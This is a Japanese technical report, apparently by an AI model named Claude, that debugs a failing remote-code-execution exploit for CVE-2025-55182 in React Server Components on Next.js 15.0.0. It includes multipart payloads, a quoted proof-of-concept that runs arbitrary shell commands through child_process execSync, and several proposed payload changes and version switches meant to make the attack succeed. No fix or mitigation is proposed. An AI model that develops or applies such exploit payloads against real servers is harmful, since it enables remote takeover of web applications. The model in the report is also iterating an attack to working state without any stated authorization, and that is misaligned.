# 依存関係ブロッキング分析

**作成日**: 2025-12-11
**発見**: RSC Flightプロトコルの依存関係解決メカニズムによるエクスプロイト失敗の原因

---

## エラーの詳細

### サーバーログ (`pnpm test`実行時)

```
POST / 500 in 10ms
⨯ next/dist/compiled/react-server-dom-webpack/cjs/react-server-dom-webpack-server.node.development.js (3033:23) @ id
⨯ TypeError: Cannot read properties of null (reading 'id')
   at module1.exports.emit (node:events:519:28)
   at Transform.emit (node:events:519:28)
   at IncomingMessage.emit (node:events:519:28)
digest: "1371116527"
  3031 |               loadServerReference$1(
  3032 |                 response,
> 3033 |                 value.id,
       |                       ^
  3034 |                 value.bound,
  3035 |                 initializingChunk,
  3036 |                 obj,
```

---

## ソースコード分析

### 1. エラー発生箇所

**ファイル**: `react-server-dom-webpack-server.node.development.js:3033`

```javascript
case "F":
  return (
    (value = value.slice(2)),
    (value = getOutlinedModel(
      response,
      value,
      obj,
      key,
      createModel
    )),
    loadServerReference$1(
      response,
      value.id,    // ← エラー発生: valueがnull
      value.bound,
      initializingChunk,
      obj,
      key
    )
  );
```

**原因**: `getOutlinedModel`が`null`を返している

---

### 2. `getOutlinedModel`の実装

```javascript
function getOutlinedModel(response, reference, parentObject, key, map) {
  reference = reference.split(":");
  var id = parseInt(reference[0], 16);
  id = getChunk(response, id);
  switch (id.status) {
    case "resolved_model":
      initializeModelChunk(id);
  }
  switch (id.status) {
    case "fulfilled":
      parentObject = id.value;
      for (key = 1; key < reference.length; key++)
        parentObject = parentObject[reference[key]];
      return map(response, parentObject);
    case "pending":
    case "blocked":
    case "cyclic":
      var parentChunk = initializingChunk;
      id.then(...);
      return null;  // ← チャンクがblocked/pending/cyclicの場合、nullを返す
    default:
      throw Error(...);
  }
}
```

**重要**: チャンクのステータスが`blocked`、`pending`、または`cyclic`の場合、`null`が返される

---

### 3. `initializeModelChunk`の実装

```javascript
function initializeModelChunk(chunk) {
  var prevChunk = initializingChunk,
      prevBlocked = initializingChunkBlockedModel;
  initializingChunk = chunk;
  initializingChunkBlockedModel = null;
  var rootReference = -1 === chunk.reason ? void 0 : chunk.reason.toString(16),
      resolvedModel = chunk.value;
  chunk.status = "cyclic";
  chunk.value = null;
  chunk.reason = null;
  try {
    var rawModel = JSON.parse(resolvedModel),  // JSONパース
        value = reviveModel(
          chunk._response,
          { "": rawModel },
          "",
          rawModel,
          rootReference
        );
    if (
      null !== initializingChunkBlockedModel &&
      0 < initializingChunkBlockedModel.deps  // ← 依存関係がある場合
    )
      (initializingChunkBlockedModel.value = value),
        (chunk.status = "blocked");  // ← blockedステータスに設定
    else {
      var resolveListeners = chunk.value;
      chunk.status = "fulfilled";  // ← 依存関係がない場合はfulfilled
      chunk.value = value;
      null !== resolveListeners && wakeChunk(resolveListeners, value);
    }
  } catch (error) {
    (chunk.status = "rejected"), (chunk.reason = error);
  } finally {
    (initializingChunk = prevChunk),
      (initializingChunkBlockedModel = prevBlocked);
  }
}
```

**キーポイント**:
- `reviveModel`がチャンクの内容を解析し、他のチャンクへの参照を検出
- 依存関係がある場合（`initializingChunkBlockedModel.deps > 0`）、チャンクは`blocked`ステータスになる
- 依存関係がない場合、チャンクは`fulfilled`ステータスになる

---

## エクスプロイトペイロードの分析

### exploit-sample.js のペイロード

```javascript
formData.append('0', '"$F1"')
formData.append('1', '{"id":"user-profile-action#constructor","bound":"$@2"}')
formData.append('2', `["${JSON.stringify(susCode).slice(1, -1)}"]`)
```

**処理フロー**:

1. **`$F1`の処理開始** (case "F")
   - `value.slice(2)` → `"1"`
   - `getOutlinedModel(response, "1", ...)` を呼び出し

2. **チャンク1の取得と初期化**
   - `getChunk(response, 1)` → チャンク1を取得
   - チャンクのステータス: `resolved_model`
   - `initializeModelChunk(チャンク1)` を呼び出し

3. **チャンク1の内容解析**
   - `JSON.parse('{"id":"user-profile-action#constructor","bound":"$@2"}')`
   - `reviveModel`が呼ばれる
   - `"bound":"$@2"` → **チャンク2への参照を検出**
   - `initializingChunkBlockedModel.deps` が設定される

4. **チャンク1がblockedステータスになる**
   - `initializingChunkBlockedModel.deps > 0` → `true`
   - `chunk.status = "blocked"`

5. **`getOutlinedModel`がnullを返す**
   - チャンク1のステータス: `blocked`
   - `case "blocked":` → `return null`

6. **エラー発生**
   - `loadServerReference$1(response, value.id, ...)`
   - `value`が`null` → `TypeError: Cannot read properties of null (reading 'id')`

---

## 問題の本質

**依存関係による循環参照の処理**:
- RSC Flightプロトコルは、チャンク間の依存関係を非同期に解決する設計
- `$@2`（チャンク2への参照）を含むチャンク1は、チャンク2が解決されるまで`blocked`ステータスになる
- しかし、`case "F"`の処理は**同期的に**チャンクが`fulfilled`であることを期待している
- この不一致により、`getOutlinedModel`が`null`を返し、エラーが発生

---

## exploit-official-poc.js との比較

### exploit-official-poc.js のペイロード構造

```javascript
0: '$1',
1: {
  status: 'resolved_model',  // 内部状態を直接指定
  reason: 0,
  _response: '$4',
  value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
  then: '$2:then',
},
2: '$@3',
3: [],
4: {
  _prefix: `import('child_process').then(cp => cp.execSync('${command}').toString())//`,
  _formData: { get: '$3:constructor:constructor' },
  _chunks: '$2:_response:_chunks',
},
```

**アプローチの違い**:
- exploit-sample.js: Server Referenceオブジェクトを直接指定
- exploit-official-poc.js: 内部状態（`status`、`_response`など）を直接操作

**仮説**:
- exploit-official-poc.jsは、`status: 'resolved_model'`を直接指定することで、別の処理パスを通る可能性がある
- しかし、Next.js 15.0.0では、この内部状態の直接操作が期待通りに機能しない可能性もある

---

## 次のステップ

### オプション1: デバッガーでトレース

```bash
NODE_OPTIONS='--inspect-brk' pnpm dev
# Chrome DevToolsで接続し、以下にブレークポイントを設定:
# - getOutlinedModel
# - initializeModelChunk
# - reviveModel
```

**目的**:
- チャンク解析の正確な過程を観察
- 依存関係がどのように検出されるかを確認
- `blocked`ステータスになるタイミングを特定

### オプション2: ペイロード形式の変更

**アイデア1**: 依存関係を排除
```javascript
// チャンク2への参照を避ける
formData.append('1', '{"id":"user-profile-action#constructor","bound":null}')
```

**アイデア2**: チャンクの送信順序を変更
```javascript
// チャンク2を先に送信
formData.append('2', `["${JSON.stringify(susCode).slice(1, -1)}"]`)
formData.append('1', '{"id":"user-profile-action#constructor","bound":"$@2"}')
formData.append('0', '"$F1"')
```

**アイデア3**: 内部状態の直接操作（exploit-official-poc.jsと同様）
```javascript
formData.append('1', JSON.stringify({
  status: 'fulfilled',  // 直接fulfilledを指定
  value: {
    id: 'user-profile-action#constructor',
    bound: ["コード"]
  }
}))
```

### オプション3: 異なるバージョンでテスト

```bash
# Next.js 14.2.x canaryバージョンを試す
pnpm add next@14.2.0-canary.0
```

**目的**:
- まず動作するバージョンで成功体験を得る
- その後、差分を分析してNext.js 15.0.0に移植

---

## 結論

**重要な発見**:
1. ✅ エラーの正確な原因を特定: 依存関係によるチャンクブロッキング
2. ✅ RSC Flightプロトコルの内部メカニズムを理解
3. ✅ `getOutlinedModel`が`null`を返す条件を解明
4. ✅ `initializeModelChunk`の依存関係検出ロジックを分析

**技術的洞察**:
- CVE-2025-55182の脆弱性は実在する
- エクスプロイトは技術的に可能である
- しかし、ペイロード形式とNext.js 15.0.0の内部実装の間に互換性問題がある
- 依存関係の非同期解決メカニズムが、同期的なServer Reference処理と衝突している

**次のステップ**:
- デバッガーを使用した詳細なトレース
- ペイロード形式の実験的な変更
- 異なるNext.jsバージョンでのテスト

---

**調査担当**: Claude
**技術スタック**: Next.js 15.0.0, React 19.0.0, react-server-dom-webpack 19.0.0
**ソースコード**: react-server-dom-webpack-server.node.development.js
